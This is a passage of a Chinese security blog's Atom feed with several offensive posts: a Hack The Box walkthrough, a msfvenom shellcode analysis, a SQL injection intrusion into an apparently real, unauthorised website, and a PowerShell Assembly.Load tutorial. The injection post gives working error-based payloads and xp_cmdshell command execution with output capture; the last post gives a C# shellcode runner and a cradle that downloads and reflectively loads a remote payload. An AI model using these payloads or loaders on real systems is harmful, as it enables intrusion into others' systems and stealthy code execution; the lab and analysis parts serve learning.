    <id>http://422926799.github.io/posts/ae09ddc5.html</id>
    <published>2021-02-19T17:10:30.000Z</published>
    <updated>2021-02-19T17:41:55.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没事干和队友打htb</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap</p><pre><code>portscan:22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>whatweb获取web信息的时候发现跳转到<code>http://academy.htb/</code>的域失败了，/etc/hosts加了上去</p><pre><code>http://academy.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], Title[Hack The Box Academy]</code></pre><p>常规的路径扫描<br><img src="https://s3.ax1x.com/2021/02/20/y4N0nU.png" alt=""></p><h2 id="入口点立足"><a href="#入口点立足" class="headerlink" title="入口点立足"></a>入口点立足</h2><p>打开web发现可以注册和登录，注册可以注册admin用户<br><img src="https://s3.ax1x.com/2021/02/20/y4NBBF.png" alt=""></p><p>到后台登录队友说是弱口令登录，but我就是tm不行。后面找其要来cookie登上，发现提示<code>dev-staging-01.academy.htb</code>,添加到hosts<br>访问发现是laravel<br><img src="https://s3.ax1x.com/2021/02/20/y4NsAJ.png" alt=""></p><p>由于开启了debug，得到API_KEY<br><img src="https://s3.ax1x.com/2021/02/20/y4N21x.png" alt=""></p><p>搜索laravel RCE发现一个CVE-2018-15133<br>exp：<a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133" target="_blank" rel="noopener">https://github.com/aljavier/exploit_laravel_cve-2018-15133</a><br>利用该CVE获得shell<br><img src="https://s3.ax1x.com/2021/02/20/y4N5He.png" alt=""></p><h2 id="获取用户权限"><a href="#获取用户权限" class="headerlink" title="获取用户权限"></a>获取用户权限</h2><p><code>ls -al /home/*</code>确定要攻击的目标用户<br>（带有user.txt的才是最终用户）<br><img src="https://s3.ax1x.com/2021/02/20/y4USEQ.png" alt=""></p><p>在web目录瞎翻，翻到两个数据库凭证<br><img src="https://s3.ax1x.com/2021/02/20/y4NoAH.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/20/y4Nju8.png" alt=""></p><p>手机/home/目录下的用户，使用hydra爆破得到用户<br><img src="https://s3.ax1x.com/2021/02/20/y4UPCn.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿完user.txt后，经过一个小时后使用linPEAss脚本进行信息收集，发现有个su的用户提权的密码<br><img src="https://s3.ax1x.com/2021/02/20/y4Ui3q.png" alt=""></p><p>登录后尝试sudo -l发现拥有sudo权限<br><img src="https://s3.ax1x.com/2021/02/20/y4UEuT.png" alt=""></p><p>GTFObins搜索到对应的提权方法<br><a href="https://gtfobins.github.io/gtfobins/composer/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/composer/</a></p><p>提权成功<br><img src="https://s3.ax1x.com/2021/02/20/y4UZbF.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;没事干和队友打htb&lt;/p&gt;
&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom生成的windows/exec shellcode分析</title>
    <link href="http://422926799.github.io/posts/c86ff70d.html"/>
    <id>http://422926799.github.io/posts/c86ff70d.html</id>
    <published>2021-02-19T04:40:56.000Z</published>
    <updated>2021-02-19T08:46:52.911Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于之前就想分析msfvenom生成的payload。经过前后几次波折<br>第三次分析后才看懂了不少。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>1.msfvenom生成shellcode<br>ps:用x86更好的分析</p><pre><code>msfvenom -p windows/exec cmd=calc.exe -f raw -o shellcode.bin</code></pre><p>2.将shellcode放入一个PE里<br>准备工具:</p><ul><li>yasm.exe</li><li>GoLink.exe<br><img src="https://s3.ax1x.com/2021/02/19/yfWvJf.png" alt=""></li></ul><p>将shellcdoe.bin和shellcode.asm放在同一个目录<br>shellcode.asm</p><pre><code class="asm">Global StartSECTION &#39;foo&#39; write,execute,readStart:incbin &quot;shellcode.bin&quot;</code></pre><p>生成obj后在生成exe</p><pre><code>yasm.win32.exe -f win32 -o shell.obj shellcode.asmGolink /ni /entry Start shell.obj</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yffFwn.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yffkoq.png" alt=""></p><p>3.利用IDA分析<br><img src="https://s3.ax1x.com/2021/02/19/yffZWT.png" alt=""></p><p>loc_401088函数分析</p><p>msf生成payload的模板对照分析<br><img src="https://s3.ax1x.com/2021/02/19/yff8Fx.png" alt=""><br>提一点:msf生成的shellcode模板对应的API是<code>hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )</code><br>计算公式：</p><pre><code class="text">msf的windows API方法：DLL HASH+API HASH=HASH如果知道最终hash求对应的API名称，计算公式：HASH-DLL HASH=API HASH例如：kernel32.dll HASH-&gt;92AF16DAWinexec HASH-&gt;F4C07457x86截取最后8位最终hash位：92AF16DA+F4C07457=876F8B31得到hash反求API hash：876F8B31-92AF16DA=F4C07457对应API和DLL 的HASH参考:https://github.com/hidd3ncod3s/WindowsAPIhash</code></pre><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a></p><pre><code class="ruby">  def self.win32_rwx_exec_thread(code, block_offset, which_offset=&#39;start&#39;)    stub_block = Rex::Payloads::Shuffle.from_graphml_file(      File.join(Msf::Config.install_root, &#39;data&#39;, &#39;shellcode&#39;, &#39;block_api.x86.graphml&#39;),      arch: ARCH_X86,      name: &#39;api_call&#39;    )    stub_exit = %Q^    ; Input: EBP must be the address of &#39;api_call&#39;.    ; Output: None.    ; Clobbers: EAX, EBX, (ESP will also be modified)    ; Note: Execution is not expected to (successfully) continue past this block    exitfunk:      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...      push 0x9DBD95A6        ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7      jl goodbye       ; Then just call the exit function...      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...      jne goodbye      ;      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread    goodbye:                 ; We now perform the actual call to the exit function      push byte 0            ; push the exit function parameter      push ebx               ; push the hash of the exit function      call ebp               ; call EXITFUNK( 0 );    ^    stub_alloc = %Q^      pushad                 ; Save registers      cld                    ; Clear the direction flag.      call start             ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.    delta:                   ;    #{stub_block}    start:                   ;      pop ebp                ; Pop off the address of &#39;api_call&#39; for calling later.    allocate_size:       mov esi,#{code.length}    allocate:      push byte 0x40         ; PAGE_EXECUTE_READWRITE      push 0x1000            ; MEM_COMMIT      push esi               ; Push the length value of the wrapped code block      push byte 0            ; NULL as we dont care where the allocation is.      push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );      mov ebx, eax           ; Store allocated address in ebx      mov edi, eax           ; Prepare EDI with the new address      mov ecx, esi           ; Prepare ECX with the length of the code      call get_payload    got_payload:      pop esi                ; Prepare ESI with the source to copy      rep movsb              ; Copy the payload to RWX memory      call set_handler       ; Configure error handling    exitblock:    #{stub_exit}    set_handler:      xor eax,eax;     push dword [fs:eax];     mov dword [fs:eax], esp      push eax               ; LPDWORD lpThreadId (NULL)      push eax               ; DWORD dwCreationFlags (0)      push eax               ; LPVOID lpParameter (NULL)      push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)      push eax               ; SIZE_T dwStackSize (0 for default)      push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)      push 0x160D6838        ; hash( &quot;kernel32.dll&quot;, &quot;CreateThread&quot; )      call ebp               ; Spawn payload thread      pop eax                ; Skip;     pop eax                ; Skip      pop eax                ; Skip      popad                  ; Get our registers back;     sub esp, 44            ; Move stack pointer back past the handler    ^    stub_final = %Q^    get_payload:      call got_payload    payload:    ; Append an arbitrary payload here    ^    stub_alloc.gsub!(&#39;short&#39;, &#39;&#39;)    stub_alloc.gsub!(&#39;byte&#39;, &#39;&#39;)    wrapper = &quot;&quot;    # regs    = %W{eax ebx ecx edx esi edi ebp}    cnt_jmp = 0    cnt_nop = 64    stub_alloc.each_line do |line|      line.gsub!(/;.*/, &#39;&#39;)      line.strip!      next if line.empty?      if cnt_nop &gt; 0 &amp;&amp; rand(4) == 0        wrapper &lt;&lt; &quot;nop\n&quot;        cnt_nop -= 1      end      if cnt_nop &gt; 0 &amp;&amp; rand(16) == 0        cnt_nop -= 2        cnt_jmp += 1        wrapper &lt;&lt; &quot;jmp autojump#{cnt_jmp}\n&quot;        1.upto(rand(8)+1) do          wrapper &lt;&lt; &quot;db 0x#{&quot;%.2x&quot; % rand(0x100)}\n&quot;          cnt_nop -= 1        end        wrapper &lt;&lt; &quot;autojump#{cnt_jmp}:\n&quot;      end      wrapper &lt;&lt; line + &quot;\n&quot;    end</code></pre><p>start函数对应分析<br><img src="https://s3.ax1x.com/2021/02/19/yffqcF.png" alt=""></p><p>由于静态call ebp这种找不到对应的地址，通过od来跟踪到loc_401088函数里的<code>call ebp</code><br>1.首先栈顶最上放出栈到ebp<br>2.然后push 1<br>3.在从堆栈里把calc.exe赋予到eax -&gt; lea eax,[ebp+0B2h]<br><img src="https://s3.ax1x.com/2021/02/19/yfhX28.png" alt=""><br>4.push eax，将calc.exe写入到堆栈<br>5.push Winexec对应的函数<br>6.然后call栈顶<br><img src="https://s3.ax1x.com/2021/02/19/yfhYEn.png" alt=""></p><p>地址跳转到00401006地址<br><img src="https://s3.ax1x.com/2021/02/19/yfI5KU.png" alt=""></p><p>PEB-&gt;Ldr-&gt;</p><pre><code> mov     edx, fs:[eax+30h] ; 寻找PEB地址foo:0040100F                 mov     edx, [edx+0Ch]  ; PEB_LDR_DATAfoo:00401012                 mov     edx, [edx+14h]  ; ModuleEntryPointfoo:00401015foo:00401015 loc_401015:                             ; CODE XREF: start+86↓jfoo:00401015                 mov     esi, [edx+28h]  ; 遍历获取某些值的区段foo:00401018                 movzx   ecx, word ptr [edx+26h] xor     edi, edi        ; 清空EDI寄存器 lodsb                   ; 将SI的存储值赋予ALfoo:0040101E                                         ; mov eax,[esi]foo:0040101E                                         ; df=1;SI+1 else SI-1</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yf78DU.png" alt=""></p><p>寻找对应API的函数</p><pre><code>0040101E   &gt; /AC            lods byte ptr ds:[esi]0040101F   . |3C 61         cmp al,0x6100401021   . |7C 02         jl short shell.0040102500401023   . |2C 20         sub al,0x2000401025   &gt; |C1CF 0D       ror edi,0xD00401028   . |01C7          add edi,eax0040102A   .^\E2 F2         loopd short shell.0040101E0040102C   .  52            push edx0040102D   .  57            push edi0040102E   .  8B52 10       mov edx,dword ptr ds:[edx+0x10]          ;  shell.0040000000401031   .  8B4A 3C       mov ecx,dword ptr ds:[edx+0x3C]00401034   .  8B4C11 78     mov ecx,dword ptr ds:[ecx+edx+0x78]00401038   .  E3 48         jecxz short shell.004010820040103A   .  01D1          add ecx,edx0040103C   .  51            push ecx0040103D   .  8B59 20       mov ebx,dword ptr ds:[ecx+0x20]00401040   .  01D3          add ebx,edx00401042   .  8B49 18       mov ecx,dword ptr ds:[ecx+0x18]00401045   &gt;  E3 3A         jecxz short shell.0040108100401047   .  49            dec ecx00401048   .  8B348B        mov esi,dword ptr ds:[ebx+ecx*4]0040104B   .  01D6          add esi,edx0040104D   .  31FF          xor edi,edi0040104F   &gt;  AC            lods byte ptr ds:[esi]00401050   .  C1CF 0D       ror edi,0xD00401053   .  01C7          add edi,eax00401055   .  38E0          cmp al,ah00401057   .^ 75 F6         jnz short shell.0040104F00401059   .  037D F8       add edi,dword ptr ss:[ebp-0x8]0040105C   .  3B7D 24       cmp edi,dword ptr ss:[ebp+0x24]0040105F   .^ 75 E4         jnz short shell.00401045</code></pre><p>最后得到的API函数地址赋于eax</p><pre><code>00401075   .  894424 24     mov dword ptr ss:[esp+0x24],eax          ;  kernel32.WinExec</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yfbU6x.png" alt=""></p><p>最后jmp eax对应的地址执行<br><img src="https://s3.ax1x.com/2021/02/19/yfbIAg.png" alt=""></p><p>执行完WinExec函数后，执行GetVersion判断退出操作<br><img src="https://s3.ax1x.com/2021/02/19/yhnum6.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhnY6I.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhna0f.png" alt=""></p><p>简写成一个过程：<br>PEB-&gt;ModuleEntryPoint-&gt;找到Kernel32.dll-&gt;WinExec-&gt;lea eax-&gt;call-&gt;Exit</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a><br><a href="https://www.anquanke.com/post/id/85386" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85386</a><br><a href="http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html" target="_blank" rel="noopener">http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html</a><br><a href="https://my.oschina.net/u/4593082/blog/4418768" target="_blank" rel="noopener">https://my.oschina.net/u/4593082/blog/4418768</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;由于之前就想分析msfvenom生成的payload。经过前后几次波折&lt;br&gt;第三次分析后才看懂了不少。&lt;/p&gt;
&lt;h2 id=&quot;分析过程&quot;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>一次糟糕的mssql注入尝试</title>
    <link href="http://422926799.github.io/posts/976028d5.html"/>
    <id>http://422926799.github.io/posts/976028d5.html</id>
    <published>2021-02-13T13:51:15.000Z</published>
    <updated>2021-02-13T15:10:47.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="观前提醒"><a href="#观前提醒" class="headerlink" title="观前提醒"></a>观前提醒</h2><p>本文已对实际的人以游戏或番剧人名代替</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>源于昨天一次组团冲塔的时候发现的一个站。原本随便看一下，没注入就换目标。结果呢<br>随手一测还真有个注入。然后开始漫长的摸索…</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>一个熟悉的登录框<br><img src="https://s3.ax1x.com/2021/02/13/ysQszT.png" alt=""></p><p>哎，反手一个引号。<code>sql server Error</code><br><img src="https://s3.ax1x.com/2021/02/13/ysQReJ.png" alt=""></p><p>sqlmap扔进去？没跑出来，经过测试，得到sqlmap command绕过 WAF （空气waf就像3090一样根本不存在）</p><pre><code>sudo proxychains sqlmap -r post.txt --tamper=space2randomblank.py,equaltolike.py -v 3</code></pre><p>盲注，慢的一批<br><img src="https://s3.ax1x.com/2021/02/13/ysQbOe.png" alt=""></p><p>就在逐个跑表的时候，一名A哥已经手注了。这时我赶紧白嫖了A哥的payload</p><pre><code>id=1&#39; and 1&lt;(select @@version) --&amp;password=11111</code></pre><p>报错注入bingo<br><img src="https://s3.ax1x.com/2021/02/13/yslulT.png" alt=""></p><p>获取所有表名或子段名/某指定表名</p><pre><code>id=admin&#39; and 1&lt;(select QUOTENAME(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#39;wwwlog&#39;  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(UNAME) from master dbo.wwwlog FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd</code></pre><p>后发现sqlmap跑出来的数据和查出来的差一大截，索性不用sqlmap<br><img src="https://s3.ax1x.com/2021/02/13/yslq3V.png" alt=""></p><p>后面测试多段注入使用cmd_shell尝试能否使用的时候，发现并未成功（后面发现的原因是master..xp_cmdshell不行，直接xp_cmdshell就可以？？？？）<br><img src="https://s3.ax1x.com/2021/02/13/ys1zM8.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>思考半天后不知如何实现回显RCE，后搜到一篇文章如醍醐灌顶。<br>创建表，把执行结果插入到表里然后读取即可</p><pre><code>id=admin&#39; CREATE TABLE tmpx (tmp1 varchar(max),tmp2 varchar(max))--&amp;password=11id=admin&#39; insert into tmpx (tmp1) exec xp_cmdshell &#39;whoami&#39;--&amp;password=11id=admin&#39; and 1&lt;(select QUOTENAME(tmp1) from tmpx FOR XML PATH(&#39;&#39;)) --&amp;password=11id=admin&#39; drop table tmpx --&amp;password=11</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>为了方便执行命令，写了个py<br><img src="https://s3.ax1x.com/2021/02/13/ysG8KK.png" alt=""></p><p>然后遇见的几个坑<br>1.type读文件不行<br>2.sql server的表存储内容大小有限，超过会被截断</p><p>解决方法统一用powershell来代替<br>读取进程</p><pre><code>powershell &quot;tasklist /svc | Select -First 35&quot; #读取到35行powershell &quot;$data=tasklist /svc;$data[36..60]&quot; #从36行读到60行</code></pre><p>用上面的第二条命令逐行读取直到读完全部<br><img src="https://s3.ax1x.com/2021/02/13/ysJmsf.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ysJQoQ.png" alt=""></p><p>powershell代替type命令读取文件</p><pre><code>powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts&quot;powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts | Select -First 10&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ysJIfA.png" alt=""></p><p>尝试上线提权发现，shell连几秒后马上断开。最后确定是IDS的问题，现在卡在这个地方…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;观前提醒&quot;&gt;&lt;a href=&quot;#观前提醒&quot; class=&quot;headerlink&quot; title=&quot;观前提醒&quot;&gt;&lt;/a&gt;观前提醒&lt;/h2&gt;&lt;p&gt;本文已对实际的人以游戏或番剧人名代替&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://422926799.github.io/tags/渗透/"/>
    
  </entry>
  
  <entry>
    <title>powershell Assembly Load的使用</title>
    <link href="http://422926799.github.io/posts/7318adbf.html"/>
    <id>http://422926799.github.io/posts/7318adbf.html</id>
    <published>2021-01-31T19:19:38.000Z</published>
    <updated>2021-01-31T19:35:28.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析昨天的vbs的时候看见了个为<code>[Reflection.Assembly]::Load</code>的技术。好像没研究过<br>就拿来研究一下。</p><p>简要说明：利用powershell进行C#里的函数调用</p><p>参考链接：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>注意实现，被调用的类名和函数名。须为public。且为静态(static)<br>test.cs</p><pre><code class="c#">using System;using System.Runtime.InteropServices;namespace run{    public class Program    {        public static void box() {            byte[] shellcode = new byte[304]{                                    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,                                    0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,                                    0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,                                    0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,                                    0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,                                    0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,                                    0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,                                    0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,                                    0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,                                    0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,                                    0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,                                    0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,                                    0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,                                    0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF,                                    0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,                                    0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,                                    0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,                                    0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,                                    0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB                                };            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);            IntPtr hThread = IntPtr.Zero;            UInt32 threadId = 0;            // prepare data            IntPtr pinfo = IntPtr.Zero;            // execute native code            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }        static void Main(string[] args)        {            // native function’s compiled code            // generated with metasploit        }        private static UInt32 MEM_COMMIT = 0x1000;        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);        [DllImport(&quot;kernel32&quot;)]        private static extern bool VirtualFree(IntPtr lpAddress,        UInt32 dwSize, UInt32 dwFreeType);        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr CreateThread(        UInt32 lpThreadAttributes,        UInt32 dwStackSize,        UInt32 lpStartAddress,        IntPtr param,        UInt32 dwCreationFlags,        ref UInt32 lpThreadId        );        [DllImport(&quot;kernel32&quot;)]        private static extern bool CloseHandle(IntPtr handle);        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 WaitForSingleObject(        IntPtr hHandle,        UInt32 dwMilliseconds        );        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr GetModuleHandle(        string moduleName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetProcAddress(        IntPtr hModule,        string procName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 LoadLibrary(        string lpFileName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetLastError();    }}</code></pre><p>利用csc生成或者vs生成 (这里csc生成对应的位数须为x86)</p><pre><code>csc.exe /unsafe /platform:x86 /out:output\run.exe output\tmp.cs</code></pre><p>基本调用</p><pre><code class="powershell">$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)[Reflection.Assembly]::Load($bytes)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVaJoT.png" alt=""></p><p>下载并执行<br>远端的payload.txt</p><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)$a=[Convert]::ToBase64String($bytes)$a | out-file &quot;payload.txt&quot;</code></pre><p>远程调用</p><pre><code>$payload=(New-Object Net.WebClient).DownloadString(&quot;URL&quot;)$tk=[Convert]::FromBase64String($payload)[Reflection.Assembly]::Load($tk)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVa0yR.png" alt=""></p><p>写了个脚本用于快速生成对应的powershell command<br><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;分析昨天的vbs的时候看见了个为&lt;code&gt;[Reflection.Assembly]::Load&lt;/code&gt;的技术。好像没研究过&lt;br&gt;</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156 sudo提权漏洞复现</title>
    <link href="http://422926799.github.io/posts/14fbb503.html"/>
    <id>http://422926799.github.io/posts/14fbb503.html</id>
    <published>2021-01-31T09:51:17.000Z</published>
    <updated>2021-01-31T10:06:03.478Z</updated>
    
